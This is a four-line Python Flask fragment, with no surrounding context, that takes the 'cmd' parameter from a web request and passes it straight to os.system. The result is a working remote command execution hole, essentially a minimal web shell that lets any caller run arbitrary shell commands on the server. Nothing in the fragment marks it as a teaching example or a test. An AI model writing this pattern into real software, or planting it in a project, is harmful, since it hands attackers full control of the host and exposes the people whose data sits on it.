import os
from flask import request
cmd = request.args.get('cmd')
result = os.system(cmd)